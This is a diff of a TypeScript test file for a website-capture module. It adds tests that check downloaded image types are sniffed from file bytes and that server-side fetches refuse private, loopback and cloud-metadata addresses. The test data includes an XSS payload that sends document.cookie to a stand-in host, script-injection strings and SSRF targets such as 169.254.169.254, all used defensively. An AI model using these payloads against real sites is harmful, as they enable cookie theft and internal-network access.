@@ -8,7 +8,7 @@ vi.mock("@mendable/firecrawl-js", () => ({
   Firecrawl: class { scrape = scrape; },
 }));
 
-import { CaptureError, captureSite, imageWidth, parseScrape, sourceUrls } from "./capture";
+import { CaptureError, captureSite, imageMime, imageWidth, parseScrape, sourceUrls } from "./capture";
 import { DISMISS_SCRIPT, EXTRACT_SCRIPT, FRAME_SCRIPT, scrollStepScript } from "./page-script";
 
 const fixture = JSON.parse(
@@ -42,6 +42,14 @@ function webpLossless(w: number, h: number) {
 const webpExtended = (w: number, h: number) => riff("VP8X", [0x10, 0, 0, 0, ...le24(w - 1), ...le24(h - 1)]);
 // A photo URL's file width: "-w700" in the name, else 1600.
 const fileWidth = (url: string) => Number(url.match(/-w(\d+)/)?.[1] ?? 1600);
+
+// DNS for the tests: IP literals resolve to themselves, *.internal.test to a private address,
+// everything else to a public one.
+const publicDns = async (host: string) => {
+  if (/^[\d.]+$/.test(host)) return [{ address: host, family: 4 }];
+  if (host.endsWith("internal.test")) return [{ address: "10.1.2.3", family: 4 }];
+  return [{ address: "93.184.216.34", family: 4 }];
+};
 
 function fakePage(over: Partial<PageData> = {}): Omit<PageData, "dismissed"> {
   return {
@@ -171,17 +179,9 @@ describe("captureSite", () => {
   beforeEach(() => { scrape.mockReset(); vi.stubEnv("FIRECRAWL_API_KEY", "fc-test"); });
   afterEach(() => { vi.unstubAllEnvs(); });
 
-  it("throws unreachable without FIRECRAWL_API_KEY and never scrapes", async () => {
-    vi.stubEnv("FIRECRAWL_API_KEY", "");
-    const err = await captureSite("janedoe.com", { fetchImpl: stubFetch().impl }).catch((e: unknown) => e);
-    expect((err as CaptureError).kind).toBe("unreachable");
-    expect((err as Error).message).toMatch(/FIRECRAWL_API_KEY/);
-    expect(scrape).not.toHaveBeenCalled();
-  });
-
   it("makes exactly one basic-proxy scrape with the brief's options", async () => {
     scrape.mockResolvedValue(fakeDoc(fakePage()));
-    await captureSite("janedoe.com", { fetchImpl: stubFetch().impl });
+    await captureSite("janedoe.com", { fetchImpl: stubFetch().impl, lookup: publicDns });
     expect(scrape).toHaveBeenCalledTimes(1);
     const [url, opts] = scrape.mock.calls[0];
     expect(url).toBe("https://janedoe.com");
@@ -194,9 +194,9 @@ describe("captureSite", () => {
     expect(FRAME_SCRIPT).toMatch(/left:0;top:0;.*opacity:0;pointer-events:none/);
   });
 
-  it("maps Firecrawl errors to unreachable", async () => {
-    scrape.mockImplementation(async () => { throw new Error("SCRAPE_TIMEOUT"); });
-    const err = await captureSite("janedoe.com", { fetchImpl: stubFetch().impl }).catch((e: unknown) => e);
+  it("maps a Firecrawl scrape timeout to unreachable", async () => {
+    scrape.mockImplementation(async () => { throw Object.assign(new Error("Scrape timed out"), { status: 408, code: "SCRAPE_TIMEOUT" }); });
+    const err = await captureSite("janedoe.com", { fetchImpl: stubFetch().impl, lookup: publicDns }).catch((e: unknown) => e);
     expect(err).toBeInstanceOf(CaptureError);
     expect((err as CaptureError).kind).toBe("unreachable");
   });
@@ -217,7 +217,7 @@ describe("captureSite", () => {
       logo: { src: "https://janedoe.com/logo.png", w: 200, h: 80 },
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.photos.map((p) => p.candidate.src)).toEqual([
       "https://janedoe.com/hero.jpg",
       "https://janedoe.com/first-big.jpg",
@@ -244,7 +244,7 @@ describe("captureSite", () => {
       ],
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.photos.map((p) => p.candidate.src)).toEqual([
       "https://janedoe.com/hero-w650.jpg",
       "https://janedoe.com/b-w1000.png",
@@ -258,7 +258,7 @@ describe("captureSite", () => {
     scrape.mockResolvedValue(fakeDoc(fakePage({
       imgs: [img("https://janedoe.com/hero-w599.jpg", 1440, 800, 0, true), img("https://janedoe.com/a-w999.jpg", 1400, 900, 0)],
     })));
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl, lookup: publicDns });
     expect(cap.photos).toEqual([]);
   });
 
@@ -267,7 +267,7 @@ describe("captureSite", () => {
       imgs: [img("https://janedoe.com/above.jpg", 1440, 900, -900), img("https://janedoe.com/hero.jpg", 1440, 960, -32, true)],
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.photos.map((p) => p.candidate.src)).toEqual(["https://janedoe.com/hero.jpg"]);
     expect(calls.some((c) => c.url.includes("above"))).toBe(false);
   });
@@ -281,7 +281,7 @@ describe("captureSite", () => {
       ],
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.photos).toHaveLength(3);
     const got = calls.filter((c) => c.url.includes("showit")).map((c) => c.url);
     expect(got).toContain("https://static.showit.co/2048/AAA/57140/hero.jpg");
@@ -295,7 +295,7 @@ describe("captureSite", () => {
       frame: false, screenH: 1080,
       imgs: [img("https://janedoe.com/a.jpg", 1400, 900, 1000), img("https://janedoe.com/b.jpg", 1600, 900, 2000)],
     })));
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl, lookup: publicDns });
     expect(cap.photos.map((p) => [p.candidate.src, p.firstScreen])).toEqual([
       ["https://janedoe.com/a.jpg", true], ["https://janedoe.com/b.jpg", false],
     ]);
@@ -305,7 +305,7 @@ describe("captureSite", () => {
     scrape.mockResolvedValue(fakeDoc(fakePage({
       imgs: [img("https://janedoe.com/broken.jpg", 1440, 800, 0), img("https://janedoe.com/ok.jpg", 1000, 700, 1200)],
     })));
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: stubFetch().impl, lookup: publicDns });
     expect(cap.photos.map((p) => p.candidate.src)).toEqual(["https://janedoe.com/ok.jpg"]);
   });
 
@@ -319,7 +319,7 @@ describe("captureSite", () => {
       ],
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.linkStatus).toEqual({
       "https://janedoe.com/shielded": 200,
       "https://janedoe.com/forbidden": 403,
@@ -344,7 +344,7 @@ describe("captureSite", () => {
       ],
     })));
     const { impl, calls } = stubFetch();
-    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
     expect(cap.linkStatus["https://www.janedoe.com/contact"]).toBe(200);
     expect(cap.linkStatus["https://janedoe.com/missing"]).toBe(404);
     expect(cap.linkStatus["https://instagram.com/janedoe"]).toBe("off-site");
@@ -354,5 +354,194 @@ describe("captureSite", () => {
     expect(heads).toHaveLength(15);
     expect(Object.values(cap.linkStatus).filter((v) => typeof v === "number")).toHaveLength(15);
     expect(calls.some((c) => c.url.includes("instagram"))).toBe(false);
+  });
+});
+
+// A fetch where each URL answers with a fixed response; anything else is a 404. Records every call.
+function routeFetch(routes: Record<string, () => Response>) {
+  const calls: { url: string; method: string; redirect?: string }[] = [];
+  const impl = vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
+    const url = String(input);
+    calls.push({ url, method: init?.method ?? "GET", redirect: init?.redirect });
+    const r = routes[url];
+    if (r) return r();
+    if (url === "https://storage.firecrawl.test/shot.jpg") {
+      return new Response(new Uint8Array(jpeg(1440, 900)), { status: 200, headers: { "content-type": "image/jpeg" } });
+    }
+    return new Response(null, { status: 404 });
+  });
+  return { impl: impl as unknown as typeof fetch, calls };
+}
+const body = (b: Buffer | string, type: string, status = 200) => () =>
+  new Response(typeof b === "string" ? b : new Uint8Array(b), { status, headers: { "content-type": type } });
+const redirectTo = (location: string, status = 302) => () => new Response(null, { status, headers: { location } });
+
+describe("downloaded image types (C1)", () => {
+  beforeEach(() => { scrape.mockReset(); vi.stubEnv("FIRECRAWL_API_KEY", "fc-test"); });
+  afterEach(() => { vi.unstubAllEnvs(); });
+
+  it("never keeps a Content-Type with markup in it: the type comes from the file's bytes", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({ logo: { src: "https://janedoe.com/logo", w: 200, h: 80 } })));
+    const { impl } = routeFetch({
+      "https://janedoe.com/logo": body(png(400, 160), `image/png"onerror="fetch('https://x/'+document.cookie)`),
+    });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(cap.logo?.mime).toBe("image/png");
+  });
+
+  it("drops a download that is not an image by type or by bytes", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({
+      logo: { src: "https://janedoe.com/logo", w: 200, h: 80 },
+      imgs: [img("https://janedoe.com/photo", 1440, 800, 0, true)],
+    })));
+    const { impl } = routeFetch({
+      "https://janedoe.com/logo": body("<script>alert(1)</script>", "text/html"),
+      "https://janedoe.com/photo": body("not an image at all", "application/octet-stream"),
+    });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(cap.logo).toBeNull();
+    expect(cap.photos).toEqual([]);
+  });
+
+  it("normalizes an allowed type and sniffs a mislabeled photo", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({
+      logo: { src: "https://janedoe.com/logo.svg", w: 200, h: 80 },
+      imgs: [img("https://janedoe.com/photo", 1440, 800, 0, true)],
+    })));
+    const { impl } = routeFetch({
+      "https://janedoe.com/logo.svg": body("<svg xmlns='http://www.w3.org/2000/svg'/>", "IMAGE/SVG+XML; charset=utf-8"),
+      "https://janedoe.com/photo": body(jpeg(1600, 900), "binary/octet-stream"),
+    });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(cap.logo?.mime).toBe("image/svg+xml");
+    expect(cap.photos[0].mime).toBe("image/jpeg");
+    for (const a of [cap.before, cap.logo!, ...cap.photos]) expect(a.mime).toMatch(/^[a-z0-9.+/-]+$/);
+  });
+});
+
+describe("imageMime", () => {
+  it("accepts only image types, else sniffs magic bytes, else null", () => {
+    expect(imageMime("image/webp", Buffer.from("x"))).toBe("image/webp");
+    expect(imageMime(' image/AVIF ;q=1', Buffer.from("x"))).toBe("image/avif");
+    expect(imageMime('image/png"x', png(10, 10))).toBe("image/png");
+    expect(imageMime("text/html", Buffer.from("GIF89a\x10\x00\x10\x00", "latin1"))).toBe("image/gif");
+    expect(imageMime("", webpLossy(10, 10))).toBe("image/webp");
+    expect(imageMime("image/x-icon", Buffer.from("hello"))).toBeNull();
+    expect(imageMime("image/svg+xml\"><script>", Buffer.from("<svg/>"))).toBeNull();
+  });
+});
+
+describe("server-side fetches are vetted (I3)", () => {
+  beforeEach(() => { scrape.mockReset(); vi.stubEnv("FIRECRAWL_API_KEY", "fc-test"); });
+  afterEach(() => { vi.unstubAllEnvs(); });
+
+  it("never fetches a logo, photo or link on a private, loopback, link-local or metadata address", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({
+      finalUrl: "http://10.0.0.5/",
+      logo: { src: "http://127.0.0.1:8080/logo.png", w: 200, h: 80 },
+      imgs: [
+        img("http://169.254.169.254/latest/meta-data/photo.jpg", 1440, 800, 0, true),
+        img("https://cms.internal.test/photo.jpg", 1440, 800, 100),
+      ],
+      buttons: [{ text: "Admin", href: "http://10.0.0.5/admin", y: 10 }],
+    })));
+    const { impl, calls } = routeFetch({});
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(calls.map((c) => c.url)).toEqual(["https://storage.firecrawl.test/shot.jpg"]);
+    expect(cap.logo).toBeNull();
+    expect(cap.photos).toEqual([]);
+    expect(cap.linkStatus["http://10.0.0.5/admin"]).toBe("no response");
+  });
+
+  it("vets every redirect hop by hand and stops at a private target", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({
+      logo: { src: "https://janedoe.com/logo.png", w: 200, h: 80 },
+      imgs: [img("https://janedoe.com/hero.jpg", 1440, 800, 0, true)],
+      buttons: [{ text: "Contact", href: "https://janedoe.com/contact", y: 10 }],
+    })));
+    const { impl, calls } = routeFetch({
+      "https://janedoe.com/logo.png": redirectTo("http://169.254.169.254/latest/meta-data/"),
+      "https://janedoe.com/hero.jpg": redirectTo("https://cdn.janedoe.com/hero.jpg", 301),
+      "https://cdn.janedoe.com/hero.jpg": body(jpeg(1600, 900), "image/jpeg"),
+      "https://janedoe.com/contact": redirectTo("http://192.168.1.1/"),
+    });
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(calls.every((c) => c.redirect === "manual")).toBe(true);
+    expect(calls.some((c) => /169\.254|192\.168/.test(c.url))).toBe(false);
+    expect(cap.logo).toBeNull();
+    expect(cap.photos.map((p) => p.mime)).toEqual(["image/jpeg"]);
+    expect(cap.linkStatus["https://janedoe.com/contact"]).toBe("no response");
+  });
+
+  it("gives up after 5 redirect hops", async () => {
+    const hops: Record<string, () => Response> = {};
+    for (let i = 0; i < 8; i++) hops[`https://janedoe.com/l${i}`] = redirectTo(`https://janedoe.com/l${i + 1}`);
+    hops["https://janedoe.com/l8"] = body(png(400, 160), "image/png");
+    scrape.mockResolvedValue(fakeDoc(fakePage({ logo: { src: "https://janedoe.com/l0", w: 200, h: 80 } })));
+    const { impl, calls } = routeFetch(hops);
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: publicDns });
+    expect(cap.logo).toBeNull();
+    expect(calls.filter((c) => c.url.includes("/l")).length).toBe(6);
+  });
+
+  it("refuses when DNS fails rather than fetching blind", async () => {
+    scrape.mockResolvedValue(fakeDoc(fakePage({ logo: { src: "https://janedoe.com/logo.png", w: 200, h: 80 } })));
+    const { impl, calls } = routeFetch({ "https://janedoe.com/logo.png": body(png(400, 160), "image/png") });
+    const flaky = async (h: string) => {
+      if (h === "janedoe.com") throw Object.assign(new Error("timeout"), { code: "ETIMEOUT" });
+      return publicDns(h);
+    };
+    const cap = await captureSite("https://janedoe.com", { fetchImpl: impl, lookup: flaky });
+    expect(cap.logo).toBeNull();
+    expect(calls.some((c) => c.url === "https://janedoe.com/logo.png")).toBe(false);
+  });
+});
+
+describe("Firecrawl failures (I1)", () => {
+  beforeEach(() => { scrape.mockReset(); vi.stubEnv("FIRECRAWL_API_KEY", "fc-test"); });
+  afterEach(() => { vi.unstubAllEnvs(); });
+
+  // The SDK's SdkError: message, status, code (from the API body), details.
+  const sdkError = (message: string, status?: number, code?: string) =>
+    Object.assign(new Error(message), { name: "FirecrawlSdkError", status, code });
+  const run = async () => captureSite("janedoe.com", { fetchImpl: routeFetch({}).impl, lookup: publicDns }).catch((e: unknown) => e);
+
+  it("a missing key is our problem, not the site's: a plain error", async () => {
+    vi.stubEnv("FIRECRAWL_API_KEY", "");
+    const err = await run();
+    expect(err).toBeInstanceOf(Error);
+    expect(err).not.toBeInstanceOf(CaptureError);
+    expect((err as Error).message).toMatch(/FIRECRAWL_API_KEY/);
+    expect(scrape).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ["401 bad key", sdkError("Unauthorized: Invalid token", 401)],
+    ["402 out of credits", sdkError("Payment Required: Insufficient credits to perform this request.", 402)],
+    ["429 rate limit", sdkError("Rate limit exceeded", 429)],
+    ["500 Firecrawl outage", sdkError("An unexpected error occurred. Please contact help@firecrawl.com", 500)],
+    ["502 bad gateway", sdkError("Request failed (502) while trying to scrape", 502)],
+    ["403 without a blocked-site message", sdkError("Forbidden", 403)],
+    ["network error to api.firecrawl.dev", sdkError("getaddrinfo ENOTFOUND api.firecrawl.dev", undefined, "ENOTFOUND")],
+    ["a plain error", new Error("socket hang up")],
+  ])("%s → plain error (retry, then failed + alert)", async (_label, e) => {
+    scrape.mockRejectedValue(e);
+    const err = await run();
+    expect(err).toBeInstanceOf(Error);
+    expect(err).not.toBeInstanceOf(CaptureError);
+  });
+
+  it.each([
+    ["scrape timeout (408)", sdkError("Scrape timed out", 408, "SCRAPE_TIMEOUT")],
+    ["client-side timeout", sdkError("timeout of 50000ms exceeded", undefined, "ECONNABORTED")],
+    ["DNS failure on the target", sdkError("DNS resolution failed for hostname: janedoe.com", 500, "SCRAPE_DNS_RESOLUTION_ERROR")],
+    ["target failing to load", sdkError("Specified URL is failing to load in the browser. Error code: ERR_CONNECTION_REFUSED", 500, "SCRAPE_SITE_ERROR")],
+    ["target failing to load, no code", sdkError("Specified URL is failing to load in the browser. Error code: ERR_NAME_NOT_RESOLVED", 500)],
+    ["blocked site", sdkError("This website is no longer supported, please reach out to help@firecrawl.com for more info on how to activate it on your account.", 403)],
+  ])("%s → CaptureError (can't see)", async (_label, e) => {
+    scrape.mockRejectedValue(e);
+    const err = await run();
+    expect(err).toBeInstanceOf(CaptureError);
+    expect((err as CaptureError).kind).toBe("unreachable");
   });
 });
